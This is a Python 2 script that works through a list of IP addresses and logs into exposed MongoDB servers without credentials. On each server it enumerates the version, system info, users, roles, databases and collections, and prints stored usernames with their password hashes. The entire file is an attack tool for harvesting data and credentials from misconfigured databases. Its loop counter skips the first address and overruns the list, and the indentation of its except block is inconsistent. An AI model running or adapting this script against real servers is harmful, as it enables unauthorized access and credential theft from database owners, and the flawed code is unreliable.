#!/usr/bin/python

import pymongo, json
from pymongo import MongoClient

file1 = open("uIPs.txt","r")
ip = file1.readlines()
counter = 0

while counter < len(ip):
	counter += 1
	print "------------------------------------------------------------------------------------"
	print "\nTesting " + ip[counter]
	
	try:
		port = 27017
		conn = pymongo.MongoClient(ip[counter],port,connectTimeoutMS=4000,socketTimeoutMS=4000)

		print "Unauthenticated Login to " + ip[counter]

		print "MongoDB Version: " +  conn.server_info()['version']

		print "Debugs enabled : " + str(conn.server_info()['debug'])

		print "Platform: " + str(conn.server_info()['bits']) + " bit"

		print "SysInfo: " + conn.server_info()['sysInfo']
		print "----------------"
		#print "\nDatabases:\n" + "\n".join(conn.database_names())

		dbs = conn.database_names()

		#print "\nDatabase: / Collections"
		db = conn.admin

		d = dict((db, [collection for collection in conn[db].collection_names()])
			for db in conn.database_names())
		#print json.dumps(d)

		listing = db.command('usersInfo')
		users = list(db.system.users.find())
		print "\nUsers / role:"
		for document in listing['users']:
			print document['user'] +" "+ document['roles'][0]['role']
		print "----------------"
		print "\nDatabase: / Collections"
		for dbItem in conn.database_names():
		            db = conn[dbItem]
		            print dbItem + ":"
		            print "\n".join(db.collection_names())
		            print "\n"

		            if 'system.users' in db.collection_names():
		                users = list(db.system.users.find())
		                print "Database Users and Password Hashes:"

		                for x in range (0,len(users)):
		                    print "Username: " + users[x]['user']
		                    print "Hash: " + users[x]['pwd']
		                    print "\n"
		
		
		conn.close()

	except Exception, e:
                if str(e).find('need to login') != -1:
                	print "Need to login."
                    conn.close()

